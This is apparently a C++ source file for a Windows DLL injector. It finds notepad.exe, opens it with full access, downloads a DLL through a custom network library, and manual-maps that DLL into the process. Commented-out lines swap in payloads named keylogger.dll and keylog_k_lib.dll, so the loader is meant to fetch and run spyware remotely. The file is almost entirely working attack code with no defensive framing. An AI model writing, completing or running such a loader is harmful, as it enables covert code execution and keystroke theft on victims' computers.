//cl /EHsc .\main.cpp .\injection.cpp /link /OUT:main.exe
#define DEBUG 1

#include "injection.h"
#include <iostream>
#include <Windows.h>
#include <vector>

///////////////////////////////////////////////////////////////////////////////////////

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);
typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
NTSTATUS ManualMap(HANDLE hproc, std::vector <unsigned char> *downloaded_dll);

///////////////////////////////////////////////////////////////////////////////////////
SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

const char szProc[] = "notepad.exe";
///////////////////////////////////////////////////////////////////////////////////////

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    if(!hModule || !funcName) return nullptr;

    BYTE* base = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    DWORD peOffset = dos->e_lfanew;
    DWORD peSig = *(DWORD*)(base + peOffset);
    
    // printf("\n[DEBUG] DOS e_lfanew: 0x%X", peOffset);
    // printf("\n[DEBUG] NT Signature: 0x%X", peSig);

    base = (BYTE*)hModule;
    dos = (IMAGE_DOS_HEADER*)base;
    if(dos->e_magic != IMAGE_DOS_SIGNATURE){ fuk("Magic did not match"); return nullptr; }

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if(nt->Signature != IMAGE_NT_SIGNATURE){ fuk("NT signature did not match"); return nullptr; }

    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if(dir.VirtualAddress == 0){ fuk("Optional header issue"); return nullptr; }

    // printf("\nExportDir VA: 0x%X, Size: 0x%X", dir.VirtualAddress, dir.Size);
    warn("Trying to resolve ",YELLOW"", funcName);

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + dir.VirtualAddress);
    DWORD* nameRVAs = (DWORD*)(base + exp->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i)
    {
        char* name = (char*)(base + nameRVAs[i]);
        if(_stricmp(name, funcName) == 0)
        {
            DWORD funcRVA = functions[ordinals[i]];
            BYTE* addr = base + funcRVA;

            // Forwarded export check
            if(funcRVA >= dir.VirtualAddress && funcRVA < dir.VirtualAddress + dir.Size)
            {
                fuk("Forwarded export: ", funcName);
                return nullptr;
            }
            norm(GREEN"\t[DONE]");
            return (void*)addr;
        }
    }

    fuk("Function not found: ", funcName);
    return nullptr;
}

void load_dll()
{
    HMODULE N_dll = LoadLibraryA("network_lib.dll");
    if (N_dll == nullptr) std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;

    receive_data_raw = (RecvDataRawFunc)FindExportAddress(N_dll, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    send_data = (SendDataFunc)FindExportAddress(N_dll, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");    
    receive_data = (RecvDataFunc)FindExportAddress(N_dll, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
}

HANDLE GetProcessHANDLE(const wchar_t* processName)
{
    PROCESSENTRY32 PE32{0};
    PE32.dwSize = sizeof(PE32);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE)
    {
        fuk("Failed to create snapshot: ", GetLastError(),"\n");
        system("pause");
        return nullptr;
    }

    DWORD PID = 0;
    // BOOL bRet = Process32First(hSnap, &PE32);
    // while(bRet)
    // {
    //     if(!_wcsicmp(reinterpret_cast<const wchar_t*>(PE32.szExeFile), L"notepad.exe"))
    //     {
    //         std::cout << "Found process: " << PE32.szExeFile << " with PID: " << PE32.th32ProcessID << std::endl;
    //         PID = PE32.th32ProcessID;
    //         break;
    //     }
    //     bRet = Process32Next(hSnap, &PE32);
    // }CloseHandle(hSnap);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe))
        {
            do
            {
                if (_wcsicmp(pe.szExeFile, processName) == 0)
                {
                    PID = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    if (PID == 0)
    {
        fuk("Target process not found");
        return nullptr;
    } norm("Process ID: ", CYAN"", PID, "\n");


    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (!hProc)
    {
        fuk("[!] Failed to open process: ", GetLastError(), "\n");
        return nullptr;
    }

    return hProc;
}

int main()
{
    HANDLE hProc = GetProcessHANDLE(L"notepad.exe");
    if(!hProc) { fuk("Somethig went wrong"); return 1; }
    else norm("hProc -> " ,CYAN"", hProc, "\n");

    load_dll();
    std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
    // std::vector <unsigned char> downloaded_dll = receive_data_raw("network_lib.dll");
    // std::vector <unsigned char> downloaded_dll = receive_data_raw("keylogger.dll");
    // std::vector <unsigned char> downloaded_dll = receive_data_raw("keylog_k_lib.dll");
    // std::vector <unsigned char> downloaded_dll = receive_data_raw("target_code.dll");
    // std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");
    if(downloaded_dll.empty()) fuk("Download fail\n");
    else { norm("\n"); ok("download done"); }


    if(!ManualMap(hProc, &downloaded_dll))
    {
        CloseHandle(hProc);
        fuk("Failed to inject DLL");
        return 1;
    } CloseHandle(hProc);

    ok("DLL injected successfully\n");
    return 0;
}